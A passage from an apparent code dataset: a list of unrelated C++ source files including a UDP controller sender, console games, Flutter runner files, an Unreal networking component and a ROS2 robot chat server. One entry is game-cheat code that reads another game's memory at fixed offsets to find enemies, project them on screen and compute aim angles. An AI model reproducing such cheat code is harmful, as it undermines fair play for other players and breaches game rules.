<< std::endl;\n        udp::endpoint receiver_endpoint =\n          *resolver.resolve(udp::v4(), bindAddr, serverPort).begin();\n        udp::socket socket(io_context);\n        socket.open(udp::v4());\n\n        VelocityControllerMessage msg;\n        msg.v_vertical = 10.0;\n        msg.v_horizontal = 20.0;\n        msg.v_fwd = -0.01;\n        msg.thetadot_horizontal = 0.023;\n        msg.thetadot_vertical = -0.497;\n        msg.btnA = false;\n        msg.btnB = true;\n        msg.btnX = false;\n        msg.btnY = true;\n\n        std::cout << msg << std::endl;\n\n        if( USE_JSON_STR )\n        {\n            std::string jstr = msg.to_json();\n            socket.send_to(boost::asio::buffer(jstr), receiver_endpoint);\n            std::cout << \"Sent the message as json\" << std::endl;\n            std::cout << jstr << std::endl;\n        }\n        else\n        {\n            std::ostringstream ssout;\n            ssout << msg;\n            std::cout << ssout.str() << std::endl;\n            std::string send_buf(ssout.str());\n            socket.send_to(boost::asio::buffer(send_buf), receiver_endpoint);\n            std::cout << \"Sent the message\" << std::endl;\n        }\n    }\n    catch (std::exception& e)\n    {\n        std::cerr << e.what() << std::endl;\n    }\n\n\n\treturn 0;\n}\n",
    "#include \"Engine.h\"\r\n#include \"Utils.h\"\r\n#include \"Globals.h\"\r\n#include \"Vector.hpp\"\r\n#include \"Vector2D.hpp\"s\r\n\r\nconstexpr float r2d = 57.2957795131f;\r\nconstexpr float d2r = 0.01745329251f;\r\n#define M_PI\t\t3.14159265358979323846f\r\n#define M_RADPI\t\t57.295779513082f\r\n#define M_PI_F\t\t((float)(M_PI))\t// Shouldn't collide with anything.\r\n#define RAD2DEG( x )  ( (float)(x) * (float)(180.f / M_PI_F) )\r\n#define DEG2RAD( x )  ( (float)(x) * (float)(M_PI_F / 180.f) )\r\n\r\nclass SettingsManager\r\n{\r\npublic:\r\n\tchar pad_0000[72]; //0x0000\r\n\tfloat GPUVendor; //0x0048\r\n\tchar pad_004C[188]; //0x004C\r\n\tint32_t GPUDedicatedMemoryMB; //0x0108\r\n\tchar pad_010C[36]; //0x010C\r\n\tfloat GPUScore; //0x0130\r\n\tchar pad_0134[76]; //0x0134\r\n\tint32_t SystemMemoryMB; //0x0180\r\n\tchar pad_0184[36]; //0x0184\r\n\tfloat CPUScore; //0x01A8\r\n\tchar pad_01AC[52]; //0x01AC\r\n\twchar_t* GPUName; //0x01E0\r\n\tchar pad_01E8[48]; //0x01E8\r\n\tint32_t InitialWindowPosX; //0x0218\r\n\tchar pad_021C[36]; //0x021C\r\n\tint32_t InitialWindowPosY; //0x0240\r\n\tchar pad_0244[92]; //0x0244\r\n\tint32_t ResolutionWidth2; //0x02A0\r\n\tchar pad_02A4[52]; //0x02A4\r\n\tint32_t ResolutionHeight2; //0x02D8\r\n\tchar pad_02DC[52]; //0x02DC\r\n\tfloat RefreshRate; //0x0310\r\n\tchar pad_0314[44]; //0x0314\r\n\tint32_t WindowedMode0; //0x0340\r\n\tchar pad_0344[4]; //0x0344\r\n\tint32_t WindowedMode; //0x0348\r\n\tchar pad_034C[268]; //0x034C\r\n\tfloat DefaultFOV0; //0x0458\r\n\tchar pad_045C[948]; //0x045C\r\n\tint32_t ResolutionWidth; //0x0810\r\n\tchar pad_0814[52]; //0x0814\r\n\tint32_t ResolutionHeight; //0x0848\r\n\tchar pad_084C[52]; //0x084C\r\n\tfloat RefreshRate2; //0x0880\r\n\tchar pad_0884[164]; //0x0884\r\n\tint32_t VSync; //0x0928\r\n\tchar pad_092C[156]; //0x092C\r\n\tfloat DefaultFOV; //0x09C8\r\n\tchar pad_09CC[2076]; //0x09CC\r\n\tfloat Brightness; //0x11E8\r\n\tchar pad_11EC[1340]; //0x11EC\r\n\tchar* PlayerName; //0x1728\r\n\tchar* PlayerName2; //0x1730\r\n\tchar pad_1738[6408]; //0x1738\r\n}; //Size: 0x3040\r\n\r\nvoid C_Engine::SetReolution()\r\n{\r\n\tauto pSettings = reinterpret_cast<SettingsManager*>(g_pOffSettings);\r\n\tGlobals::g_iWindowWidth = pSettings->ResolutionWidth; Globals::g_iWindowHeight = pSettings->ResolutionHeight;\r\n}\r\n\r\nuint16_t C_Engine::GetMaxEntitys()\r\n{\r\n\treturn *(uint16_t*)(g_pOffGame + 0x1D0); // 2bytes\r\n}\r\n\r\nArray<C_BaseEntity*> C_Engine::GetEntities()\r\n{\r\n\treturn *(Array<C_BaseEntity*>*)(g_pOffGame + 0x1C8);\r\n}\r\n\r\nC_BaseEntity* C_Engine::GetLocal()\r\n{\r\n\treturn Utils::ReadPtr<C_BaseEntity*>({ g_pOffProfile, 0x68, 0x0, 0x28 }, false);\r\n}\r\n\r\nC_Camera* C_Engine::GetCamera()\r\n{\r\n\treturn Utils::ReadPtr<C_Camera*>({ g_pOffCamera, 0xE0, 0x1D8, 0x8 }, true); // deref first addy\r\n}\r\n\r\nbool C_Engine::IsInGame()\r\n{\r\n\treturn Utils::Read<bool>(g_pOffStatus + 0x374);\r\n}\r\n\r\nbool C_Engine::WorldToScreen(const Vector& origin, Vector2D& screen)\r\n{\r\n\tg_pCamera = GetCamera();\r\n\tif (!g_pCamera)\r\n\t\treturn false;\r\n\r\n\tVector temp = origin - g_pCamera->GetViewTranslation();\r\n\tfloat x = temp.Dot(g_pCamera->GetViewRight());\r\n\tfloat y = temp.Dot(g_pCamera->GetViewUp());\r\n\tfloat z = temp.Dot(g_pCamera->GetViewForward() * -1);\r\n\tscreen.x = (Globals::g_iWindowWidth / 2) * (1 + x / g_pCamera->GetViewFovX() / z);\r\n\tscreen.y = (Globals::g_iWindowHeight / 2) * (1 - y / g_pCamera->GetViewFovY() / z);\r\n\r\n\treturn z >= 1.0f;\r\n}\r\n\r\nfloat C_Engine::W2SDistance(Vector position)\r\n{\r\n\tif (!g_pCamera)\r\n\t\treturn -1;\r\n\r\n\tVector2D out;\r\n\tWorldToScreen(position, out);\r\n\treturn (fabs(out.x - (Globals::g_iWindowWidth / 2)) + fabs(out.y - (Globals::g_iWindowHeight / 2)));\r\n}\r\n\r\nVector C_Engine::CalcAngle(Vector enemypos, Vector camerapos)\r\n{\r\n\tfloat r2d = 57.2957795131f;\r\n\r\n\tVector dir = enemypos - camerapos;\r\n\r\n\tfloat x = asin(dir.z / dir.Length()) * r2d;\r\n\tfloat z = atan(dir.y / dir.x) * r2d;\r\n\r\n\tif (dir.x >= 0.f) z += 180.f;\r\n\tif (x > 180.0f) x -= 360.f;\r\n\telse if (x < -180.0f) x += 360.f;\r\n\r\n\treturn Vector(x, 0.f, z + 90.f);\r\n}",
    "#include <iostream>\r\n#include <vector>\r\n#include <time.h>\r\n\r\nusing namespace std;\r\n\r\n//Funciones\r\nvoid LimpiarPantalla();\r\nvoid Configuracion();\r\nvoid JugarPartida();\r\nbool ComprobarCasillas();\r\nvoid MostrarTablero(bool mostrarBombas);\r\nint DescubrirCasilla();\r\nvoid LlenarTablero();\r\nvoid VaciarSector(int y, int x);\r\n\r\n//Matriz\r\nvector<vector<int>> tablero;\r\n\r\n//Variables\r\n//Elecci\u00f3n del men\u00fa\r\nchar eleccion;\r\n//Tama\u00f1o del tablero\r\nvector<int> tamTablero(2);\r\n//Posici\u00f3n en el tablero\r\nvector<int> posCasilla(2);\r\n//Cantidad de minas\r\nint cantMinas = 0;\r\n//Tablero con bombas\r\nbool tableroConBombas = false;\r\n//Vecinos bombas\r\nvector<vector<int>> operaciones = {{1,0},{1,1},{0,1},{-1,1},{-1,0},{-1,-1},{0,-1},{1,-1}};\r\n\r\n//M\u00e9todo principal\r\nint main(){\r\n    while(true){\r\n        //Limpiar pantalla\r\n        LimpiarPantalla();\r\n        //Titulo\r\n        cout<<\"::::BUSCAMINAS::::\"<<endl;\r\n        //Opciones del men\u00fa\r\n        cout<<\"1) Jugar\"<<endl;\r\n        cout<<\"2) Salir\"<<endl;\r\n        cout<<\"Elecci\u00f3n: \";\r\n        //Guardar elecci\u00f3n del men\u00fa\r\n        cin>>eleccion;\r\n        //Instrucciones de la opci\u00f3n\r\n        switch(eleccion){\r\n            //Partida\r\n            case '1':\r\n                //Funci\u00f3n de configuraci\u00f3n\r\n                Configuracion();\r\n                //Jugar partida\r\n                JugarPartida();\r\n                break;\r\n            //Salir\r\n            case '2':\r\n                return 0;\r\n                break;\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n\r\n//Funci\u00f3n limpiar pantalla\r\nvoid LimpiarPantalla(){\r\n    //Limpiar pantalla para Windows\r\n    if(system(\"cls\") == -1){\r\n        cout<<\"Error al borrar pantalla\"<<endl;\r\n    }\r\n}\r\n\r\n//Funci\u00f3n configuraci\u00f3n\r\nvoid Configuracion(){\r\n    //Limpiar pantalla\r\n    LimpiarPantalla();\r\n    //Titulo\r\n    cout<<\"::::CONFIGURACION::::\"<<endl;\r\n    //Ingresa el tama\u00f1o del tablero\r\n    cout<<\"Ingrese el tama\u00f1o del tablero: \"<<endl;\r\n    //Guardar el tama\u00f1o del tablero\r\n    cin>>tamTablero[0]>>tamTablero[1];\r\n    //Ingresa la cantidad de minas\r\n    cout<<\"Ingrese la cantidad de minas: \";\r\n    //Guardar cantidad de minas\r\n    cin>>cantMinas;\r\n    //Redimensionar tablero\r\n    tablero.resize(tamTablero[0],(vector<int>(tamTablero[1])));\r\n    for(int i = 0; i < tamTablero[0]; i++){\r\n        for(int j = 0; j < tamTablero[1]; j++){\r\n            tablero[i][j] = -1;\r\n        }\r\n    }\r\n}\r\n\r\n//Funci\u00f3n jugar partida\r\nvoid JugarPartida(){\r\n    tableroConBombas = false;\r\n    while(ComprobarCasillas()){\r\n        //Mostrar tablero\r\n        MostrarTablero(false);\r\n        //Opciones del usuario\r\n        cout<<\"\\n1) Descubrir Casilla\"<<endl;\r\n        cout<<\"2) Marcar Casilla\"<<endl;\r\n        cout<<\"3) Desmarcar Casilla\"<<endl;\r\n        cout<<\"Eleccion: \";\r\n        //Guardar elecci\u00f3n\r\n        cin>>eleccion;\r\n        int retorno;\r\n        switch (eleccion){\r\n            case '1':\r\n                //Pedir posici\u00f3n\r\n                cout<<\"Ingrese la posicion de la casilla a descubrir: \";\r\n                //Guardar posici\u00f3n\r\n                cin>>posCasilla[0]>>posCasilla[1];\r\n                retorno = DescubrirCasilla();\r\n                //Perdi\u00f3 al descubrir casilla\r\n                if(retorno == -1){\r\n                    return;\r\n                }else if(retorno == 2 && tableroConBombas){\r\n                    //Vaciar sector\r\n                    VaciarSector(posCasilla[0],posCasilla[1]);\r\n                }\r\n                if(!tableroConBombas){\r\n                    //Llenar el tablero con bombas\r\n                    LlenarTablero();\r\n                    tablero[posCasilla[0]][posCasilla[1]] = -1;\r\n                    tableroConBombas = true;\r\n                    retorno = DescubrirCasilla();\r\n                    if(retorno == -1){\r\n                        return;\r\n                    }else if(retorno == 2 && tableroConBombas){\r\n                        //Vaciar sector\r\n                        VaciarSector(posCasilla[0],posCasilla[1]);\r\n                    }\r\n                }\r\n                break;\r\n            case '2':\r\n                //Pedir posici\u00f3n\r\n                cout<<\"Ingrese la posicion de la casilla a marcar: \";\r\n                //Guardar posici\u00f3n\r\n                cin>>posCasilla[0]>>posCasilla[1];\r\n                if(tablero[posCasilla[0]][posCasilla[1]] == 10){\r\n                    tablero[posCasilla[0]][posCasilla[1]] = 1011;\r\n                }else if(tablero[posCasilla[0]][posCasilla[1]] == -1){\r\n                    tablero[posCasilla[0]][posCasilla[1]] = 11;\r\n                }\r\n                break;\r\n            case '3':\r\n                //Pedir posici\u00f3n\r\n                cout<<\"Ingrese la posicion de la casilla a desmarcar: \";\r\n                //Guardar posici\u00f3n\r\n                cin>>posCasilla[0]>>posCasilla[1];\r\n                if(tablero[posCasilla[0]][posCasilla[1]] == 11){\r\n                    tablero[posCasilla[0]][posCasilla[1]] = -1;\r\n                }else if(tablero[posCasilla[0]][posCasilla[1]] == 1011){\r\n                    tablero[posCasilla[0]][posCas",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"state_management\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n#include \"SmoothSync.h\"\n#include \"State.h\"\n#include \"Engine/World.h\"\n#include \"Runtime/Engine/Classes/Engine/WorldComposition.h\"\n#include \"Components/PrimitiveComponent.h\"\n#include \"Runtime/Launch/Resources/Version.h\"\n\n// Sets default values for this component's properties\nUSmoothSync::USmoothSync()\n{\n\t// So the component can tick every frame.\n\tPrimaryComponentTick.bCanEverTick = true;\n}\n// Called whenever this actor is being removed from a level\nvoid USmoothSync::EndPlay(const EEndPlayReason::Type EndPlayReason)\n{\n\tSuper::EndPlay(EndPlayReason);\n\n\t// Only clean up if not in the middle of a tick\n\t// Otherwise set a flag so clean up will happen when TickComponent is done.\n\tif (!IsTicking)\n\t{\n\t\tCleanUp();\n\t}\n\telse\n\t{\n\t\tShouldCleanUp = true;\n\t}\n}\n\nvoid USmoothSync::CleanUp()\n{\n\tif (stateBuffer != nullptr)\n\t{\n\t\tfor (int i = 0; i < FMath::Max(calculatedStateBufferSize, 30); i++)\n\t\t{\n\t\t\tdelete(stateBuffer[i]);\n\t\t\tstateBuffer[i] = nullptr;\n\t\t}\n\n\t\tdelete[] stateBuffer;\n\t\tstateBuffer = nullptr;\n\t}\n\n\tdelete sendingTempState;\n\tsendingTempState = nullptr;\n\tdelete targetTempState;\n\ttargetTempState = nullptr;\n\n\tShouldCleanUp = false;\n}\n\n// Native event for when play begins for this actor.\nvoid USmoothSync::BeginPlay()\n{\n\tSuper::BeginPlay();\n\n#ifdef TimeSync\n\tUE_LOG(LogTemp, Warning, TEXT(\"TimeSync support detected.\"));\n\ttimeSync = GetWorld()->GetGameState()->FindComponentByClass<UTimeSyncGameStateComponentBase>();\n\tif (timeSync == nullptr && enableLagCompensation)\n\t{\n\t\tenableLagCompensation = false;\n\t\tUE_LOG(LogTemp,\n\t\t\tError,\n\t\t\tTEXT(\n\t\t\t\t\"Lag compensation is enabled but Time Sync is not properly configured so it won't work.\\n\"\n\t\t\t\t\"Falling back to built in time syncing.\\n\"\n\t\t\t\t\"Make sure your GameState has a TimeSyncGameStateComponent and that your are calling \"\n\t\t\t\t\"SpawnTimerForPlayer from the OnPostLogin event in your GameController.\"\n\t\t\t)\n\t\t);\n\t}\n#endif\n\n\trealObjectToSync = GetOwner();\n\tmovementComponent = (UMovementComponent*)realObjectToSync->FindComponentByClass(UMovementComponent::StaticClass());\n\tcharacterMovementComponent = (UCharacterMovementComponent*)realObjectToSync->FindComponentByClass(UCharacterMovementComponent::StaticClass());\n\n\t// If haven't chosen to sync a specific component, set it up to sync the root component.\n\tif (realComponentToSync == nullptr)\n\t{\n\t\tprimitiveComponent = Cast<UPrimitiveComponent>(realObjectToSync->GetRootComponent());\n\n\t\tif (primitiveComponent && primitiveComponent->IsSimulatingPhysics())\n\t\t{\n\t\t\tisSimulatingPhysics = true;\n\t\t}\n\t}\n\n\t// Setup some variable states for use.\n\tsendingTempState = new SmoothState();\n\ttargetTempState = new SmoothState();\n\tstateBuffer = new SmoothState * [FMath::Max(calculatedStateBufferSize, 30)];\n\tint stateBufferLength = FMath::Max(calculatedStateBufferSize, 30);\n\tfor (int i = 0; i < stateBufferLength; i++)\n\t{\n\t\tstateBuffer[i] = nullptr;\n\t}\n\n\t// If we want to extrapolate forever, force variables accordingly. \n\tif (extrapolationMode == ExtrapolationMode::UNLIMITED)\n\t{\n\t\tuseExtrapolationDistanceLimit = false;\n\t\tuseExtrapolationTimeLimit = false;\n\t}\n\n\t// We need to do this in order to send unreliable RPCs?\n\tSetIsReplicated(true);\n}\n\n/// <summary>\n/// If you want to track a scene component, assign it, otherwise it will just sync the actor the SmoothSync is on.\n/// Must have one SmoothSync for each Transform that you want to sync.\n/// <summary>\nvoid USmoothSync::setSceneComponentToSync(USceneComponent* componentToSync)\n{\n\trealComponentToSync = componentToSync;\n\tprimitiveComponent = Cast<UPrimitiveComponent>(realComponentToSync);\n\tif (primitiveComponent && primitiveComponent->IsSimulatingPhysics())\n\t{\n\t\tisSimulatingPhysics = true;\n\t}\n\telse\n\t{\n\t\tisSimulatingPhysics = false;\n\t}\n}\n\ntemplate <class T>\nvoid USmoothSync::copyToBuffer(T thing)\n{\n\tuint8* thingAsChars = (uint8*)&thing;\n\tfor (int i = 0; i < sizeof(T); i++)\n\t{\n\t\tsendingCharArray.Add(thingAsChars[i]);\n\t}\n\n\tsendingCharArraySize += sizeof(T);\n}\n\ntemplate <class T>\nvoid USmoothSync::readFromBuffer(T* thing)\n{\n\tuint8* thingAsChars = (uint8*)thing;\n\tfor (int i = 0; i < sizeof(T); i++)\n\t{\n\t\tthingAsChars[i] = readingCharArray[readingCharArraySize + i];\n\t}\n\n\treadingCharArraySize += sizeof(T);\n}\n\n/// <summary>\n/// Encode sync info based on what we want to send.\n/// </summary>\nchar USmoothSync::encodeSyncInformation(bool sendPositionFlag, bool sendRotationFlag, bool sendScaleFlag, bool sendVelocityFlag,\n\tbool sendAngularVelocityFlag, bool atPositionalRestFlag, bool atRotationalRestFlag, bool sendMovementModeFlag)\n{\n\tchar encoded = 0;\n\n\tif (sendPositionFlag)\n\t{\n\t\tencoded = (char)(encoded | positionMask);\n\t}\n\tif (sendRotationFlag)\n\t{\n\t\tencoded = (char)(encoded | rotationMask);\n\t}\n\tif (sendScaleFlag)\n\t{\n\t\tencoded = (char)(encoded | scaleMask);\n\t}\n\tif (sendVelocityFlag)\n\t{\n\t\tencoded = (char)(encoded | velocityMask);\n\t}\n\tif (sendAngularVelocityFlag)\n\t{\n\t\tencoded = (char)(encoded | angularVelocityMask);\n\t}\n\tif (atPositionalRestFlag)\n\t{\n\t\te",
    "//\n// CarDodgeCore.cpp - Houses the CarDodgeCore class.\n//\n\n#include <random>\n#include <chrono>\n#include <fstream>\n#include \"../../CarDodge_Definitions/ZeeTerminalCore.h\"\n#include \"../../CarDodge_Definitions/ZTFormattingDefinitions.h\"\n\n#include \"../../RyRyCryptor/RyRyCryptor.h\"\n#include \"../CarInfo/CarInfo.h\"\n#include \"CarDodgeCore.h\"\n\nCarInfo EnemyCars[128];\nCarInfo UserCar;\nconst int nEnemyCarArraySize = sizeof(EnemyCars) / sizeof(CarInfo);\n\n// InitialiseCarDodgeCore\nvoid CarDodgeCore::InitialiseCarDodgeCore() {\n\t// Set session console window height - cannot be less than 30\n\tCONSOLE_SCREEN_BUFFER_INFO csbiTest;\n\tGetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &csbiTest);\n\tnSessionConsoleHeight = csbiTest.srWindow.Bottom - csbiTest.srWindow.Top;\n\tif (nSessionConsoleHeight < 29) {\n\t\tnSessionConsoleHeight = 29;\n\t}\n\n\t// Initialise random engine\n\tstd::random_device rdRandNum;\n\tRandEngine.seed(rdRandNum());\n\n\t// To improve performance, do not sync with stdio - it's not being used\n\tbSyncWithStdioPrevious = std::cout.sync_with_stdio(false);\n\n\t// Update high score global variable\n\tUpdateHighScoreFromFile();\n\n\t// Game Initialised - Set flag to true\n\tbCarDodgeCoreInitialised = true;\n\n\treturn;\n}\n\n// GetNextEmptyEnemyCarIndex\nint CarDodgeCore::GetNextEmptyEnemyCarIndex() {\n\tint nEnemyCarIndexFind = 0;\n\n\t// Reiterate through whole enemy car array to find next empty cell\n\tfor (; nEnemyCarIndexFind < nEnemyCarArraySize; nEnemyCarIndexFind++) {\n\t\tif (EnemyCars[nEnemyCarIndexFind].bInUse == false) {\n\t\t\treturn nEnemyCarIndexFind;\n\t\t}\n\t}\n\n\treturn nEnemyCarArraySize + 1; // This is to indicate that there are no more spaces left\n}\n\n// RenderCar\nvoid CarDodgeCore::RenderCar(CarInfo ciCarToRender) {\n\t// Set starting point\n\tSetCursorPosition(ciCarToRender.bottomLeft.X, ciCarToRender.bottomLeft.Y - 3);\n\n\t// Render all 4 rows\n\tfor (int i = 0; i < 4; i++) {\n\t\t// Render car character on screen\n\t\tstd::cout.write(ciCarToRender.CarStyle[i].data(), 4);\n\t\t// Move to next position down for render\n\t\tif (i < 3) SetCursorPosition(ciCarToRender.bottomLeft.X, ciCarToRender.bottomLeft.Y + (i - 2));\n\t}\n\n\treturn;\n}\n\n// EraseCar\nvoid CarDodgeCore::EraseCar(CarInfo ciCarToErase) {\n\t// Set starting point\n\tSetCursorPosition(ciCarToErase.bottomLeft.X, ciCarToErase.bottomLeft.Y - 3);\n\n\t// Erase all 4 rows\n\tfor (int i = 0; i < 4; i++) {\n\t\t// 4 because cars are 4 cells in width\n\t\tstd::cout.write(\"    \", 4);\n\t\t// Move to next position down for erase\n\t\tif (i < 3) SetCursorPosition(ciCarToErase.bottomLeft.X, ciCarToErase.bottomLeft.Y + (i - 2));\n\t}\n\n\treturn;\n}\n\n// RenderBorders\nvoid CarDodgeCore::RenderBorders(std::string sSetBorderColourFore, std::string sSetBorderColourBack)\n{\n\tHANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n\tif (hConsole == INVALID_HANDLE_VALUE) {\n\t\t// Error handling later\n\t}\n\n\t// Initialise game if not initialised\n\tif (!bCarDodgeCoreInitialised) {\n\t\tInitialiseCarDodgeCore();\n\t}\n\n\tcolour(sColourGlobal, sColourGlobalBack);\n\tcls(); // Set colours to whole screen, clear for gameplay\n\tSetCursorPosition(0, 0); // Ensure that the cursor position is at the top left of terminal\n\n\t// Set border colours for CarDodgeMain::UpdatePanelInfo()\n\tsBorderColourFore = sSetBorderColourFore;\n\tsBorderColourBack = sSetBorderColourBack;\n\n\tcolour(sSetBorderColourFore, sSetBorderColourBack);\n\n\t// 1. Draw left side border\n\tfor (short int i = 0; i <= nSessionConsoleHeight; i++) {\n\t\t// Repeat creation of sides with std::string buffer\n\t\tstd::cout << std::string(nLeftBorderWidth - 1, ' ') << '\\xb2';\n\t\tif (i < nSessionConsoleHeight) std::cout << '\\n';\n\t}\n\n\t// 2. Draw right side border\n\tfor (short int i = 0; i <= nSessionConsoleHeight; i++) {\n\t\t// Repeat creation of sides with std::string buffer\n\t\tSetCursorPosition(nScreenWidth - nRightBorderWidth, i);\n\t\tstd::cout << '\\xb2' << std::string(nRightBorderWidth - 1, ' ');\n\t\tif (i < nSessionConsoleHeight) std::cout << '\\n';\n\n\t}\n\n\tcolour(sColourGlobal, sColourGlobalBack);\n\n\treturn;\n}\n\n// MoveUserCarLeft\nvoid CarDodgeCore::MoveUserCarLeft() {\n\t// Check if user car is already at the left border, with respect to car turning speed\n\tif (UserCar.bottomLeft.X - nCarDodgeCarTurningSpeed < nLeftBorderWidth) {\n\t\treturn;\n\t}\n\n\tEraseCar(UserCar);\n\n\t// Move car left by nCarDodgeCarTurningSpeed\n\tUserCar.bottomLeft.X -= nCarDodgeCarTurningSpeed;\n\tUserCar.bottomRight.X -= nCarDodgeCarTurningSpeed;\n\n\tRenderCar(UserCar);\n\n\treturn;\n}\n\n// MoveUserCarRight\nvoid CarDodgeCore::MoveUserCarRight() {\n\t// Check if user car is already at the right border, with respect to car turning speed\n\tif (UserCar.bottomRight.X + nCarDodgeCarTurningSpeed >= nScreenWidth - nRightBorderWidth) {\n\t\treturn;\n\t}\n\n\tEraseCar(UserCar);\n\n\t// Move car right by nCarDodgeCarTurningSpeed\n\tUserCar.bottomLeft.X += nCarDodgeCarTurningSpeed;\n\tUserCar.bottomRight.X += nCarDodgeCarTurningSpeed;\n\n\tRenderCar(UserCar);\n\n\treturn;\n}\n\n// RenderNewEnemyCar\nvoid CarDodgeCore::RenderNewEnemyCar() {\n\tstatic std::uniform_int_distribution<short int> Dist(nLeftBorderWidth, nScreenWidth -",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "// Copyright 2024 Antonio Bono\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n\n#include \"hni_cpp/chat_action_server.hpp\"\n\n#include <algorithm>\n#include <array>\n#include <cctype>  // std::isalpha\n#include <chrono>\n#include <cstring>\n#include <functional>\n#include <iostream>\n#include <memory>\n#include <queue>\n#include <sstream>  //std::stringstream\n#include <string>\n#include <thread>\n#include <unordered_map>\n#include <vector>\n\n#include \"hni_interfaces/action/chat_play.hpp\"\n#include \"hni_interfaces/action/joints_play.hpp\"\n#include \"hni_interfaces/srv/text_to_speech.hpp\"\n#include \"nao_led_interfaces/action/leds_play.hpp\"\n#include \"nao_led_interfaces/msg/led_indexes.hpp\"\n#include \"nao_led_interfaces/msg/led_modes.hpp\"\n#include \"nao_lola_command_msgs/msg/chest_led.hpp\"\n#include \"nao_lola_command_msgs/msg/head_leds.hpp\"\n#include \"nao_lola_command_msgs/msg/left_ear_leds.hpp\"\n#include \"nao_lola_command_msgs/msg/left_eye_leds.hpp\"\n#include \"nao_lola_command_msgs/msg/left_foot_led.hpp\"\n#include \"nao_lola_command_msgs/msg/right_ear_leds.hpp\"\n#include \"nao_lola_command_msgs/msg/right_eye_leds.hpp\"\n#include \"nao_lola_command_msgs/msg/right_foot_led.hpp\"\n\n//#include \"hni_cpp/joints_play_action_client.hpp\"\n//#include \"nao_led_server/led_action_server.hpp\"\n\n#include \"rclcpp/rclcpp.hpp\"\n#include \"rclcpp/time.hpp\"\n#include \"rclcpp_action/rclcpp_action.hpp\"\n#include \"rclcpp_components/register_node_macro.hpp\"\n#include \"std_srvs/srv/set_bool.hpp\"\n\nnamespace hni_chat_action_server\n{\n\nusing namespace std::chrono_literals;\n\nChatActionServer::ChatActionServer(const rclcpp::NodeOptions & options)\n: rclcpp::Node(\"chat_action_server_node\", options), kSecPerWord_(0.5), kForwardParam_(10)\n{\n  using namespace std::placeholders;\n\n  this->gstt_srv_client_ = this->create_client<std_srvs::srv::SetBool>(\"gstt_service\");\n\n  this->gtts_srv_client_ = this->create_client<hni_interfaces::srv::TextToSpeech>(\"gtts_service\");\n\n  this->chat_srv_client_ = this->create_client<hni_interfaces::srv::Chat>(\"chatGPT_service\");\n\n  this->leds_play_act_client_ =\n    rclcpp_action::create_client<nao_led_interfaces::action::LedsPlay>(this, \"leds_play\");\n\n  this->joints_act_client_ =\n    rclcpp_action::create_client<hni_interfaces::action::JointsPlay>(this, \"joints_play\");\n\n  this->action_server_ = rclcpp_action::create_server<hni_interfaces::action::ChatPlay>(\n    this, \"chat_play\", std::bind(&ChatActionServer::handleGoal, this, _1, _2),\n    std::bind(&ChatActionServer::handleCancel, this, _1),\n    std::bind(&ChatActionServer::handleAccepted, this, _1));\n\n  moves_map_[\"hello\"] = \"install/hni_cpp/include/moves/hello.txt\";\n  moves_map_[\"hi\"] = 